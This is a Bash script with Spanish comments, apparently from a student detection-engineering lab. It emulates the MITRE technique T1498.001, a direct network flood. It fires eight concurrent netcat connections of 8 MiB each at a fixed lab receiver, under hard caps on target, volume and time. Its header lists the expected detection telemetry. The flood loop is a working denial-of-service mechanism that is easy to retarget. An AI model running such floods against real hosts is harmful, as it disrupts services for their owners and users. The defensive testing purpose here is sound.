#!/usr/bin/env bash
# ============================================================================
# ATA048 · T1498.001 Direct Network Flood — ataque MANUAL (escrito por el TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1498.001 Network DoS: Direct Network Flood (tactica Impact)
# Fuente  : custom (escrito por el TFG). ART no trae prueba de T1498 -> propio.
# Objetivo: generar un FLOOD DE RED VOLUMETRICO ACOTADO contra el RECEPTOR DEL
#           LABORATORIO (receptor del HOST en VMnet1, puerto TCP crudo 9091 del
#           `sink_http.py`). Demuestra el mecanismo (rafaga masiva de bytes por
#           TCP), NO una caida real.
# Destino : tcp://192.168.65.1:9091 (receptor del HOST / laboratorio). NUNCA el
#           manager (192.168.65.128) ni ningun servicio real.
# Ejecuta : desde /home/angel/lab-attack/ATA048 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ GUARDARRAIL DURO (aborta): destino FIJO 192.168.65.1:9091; TOTAL_BYTES <= 128 MiB;
#    CONN <= 8; MAX_TIME <= 15 s; cada conexion bajo `timeout`.
#
# Telemetria esperada (ver README §5):
#   - execve de nc (flood TCP)       -> 80792 (deteccion; T1498.001-S1).
#   - execve de head (genera bytes)  -> 80792 (deteccion; S2).
#   - execve de timeout (cota)       -> 80792 (deteccion; S3).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA048/*` (S4).
#
# Prueba de exito (INDEPENDIENTE de la alerta): el `sink.log` del HOST registra
#   las conexiones TCP con `len` y la suma de bytes == TOTAL_BYTES enviados.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA048"
HOST="192.168.65.1"
PORT="9091"
CONN=8
BYTES_PER_CONN=$((8 * 1024 * 1024))   # 8 MiB por conexion
TOTAL_BYTES=$((CONN * BYTES_PER_CONN))
MAX_BYTES=$((128 * 1024 * 1024))      # tope duro 128 MiB
MAX_CONN=8
MAX_TIME=15

echo "ATA048 · T1498.001 Direct Network Flood (TCP volumetrico acotado) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
for t in nc head timeout; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "ERROR: $t no disponible" >&2
    exit 1
  fi
done

# --- GUARDARRAIL DE RECURSOS/DESTINO ---
if [ "$TOTAL_BYTES" -gt "$MAX_BYTES" ] || [ "$CONN" -gt "$MAX_CONN" ] || [ "$MAX_TIME" -gt 15 ]; then
  echo "ERROR: topes fuera de rango (abortado por seguridad)" >&2
  exit 1
fi
if [ "$HOST" != "192.168.65.1" ] || [ "$PORT" != "9091" ]; then
  echo "ERROR: destino '$HOST:$PORT' fuera del receptor del laboratorio; ABORTADO" >&2
  exit 1
fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

pids=""
killpids() { [ -n "$pids" ] && kill $pids 2>/dev/null || true; }
trap killpids EXIT

# 1) FLOOD TCP VOLUMETRICO: CONN conexiones concurrentes, cada una envia BYTES_PER_CONN.
#    (execve de head + nc + timeout; la tuberia va bajo `timeout` -> cota dura).
echo "--- flood: CONN=$CONN bytes_por_conexion=$BYTES_PER_CONN total=$TOTAL_BYTES ---"
i=1
while [ "$i" -le "$CONN" ]; do
  ( timeout --signal=TERM "${MAX_TIME}s" bash -c \
      "head -c $BYTES_PER_CONN /dev/zero | nc -N $HOST $PORT" ) &
  pids="$pids $!"
  i=$((i + 1))
done
wait
rc=$?
echo "wait_rc=$rc"

echo "--- estado final ---"
echo "total_bytes_objetivo=$TOTAL_BYTES"
echo "procesos_nc_residuales=$(pgrep -x nc.openbsd | wc -l)"
if [ "$(pgrep -x nc.openbsd | wc -l)" -eq 0 ]; then
  echo "NET_FLOOD=OK (flood TCP acotado enviado; 0 procesos nc residuales)"
  trap - EXIT
else
  echo "NET_FLOOD=FALLO (quedan procesos nc)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
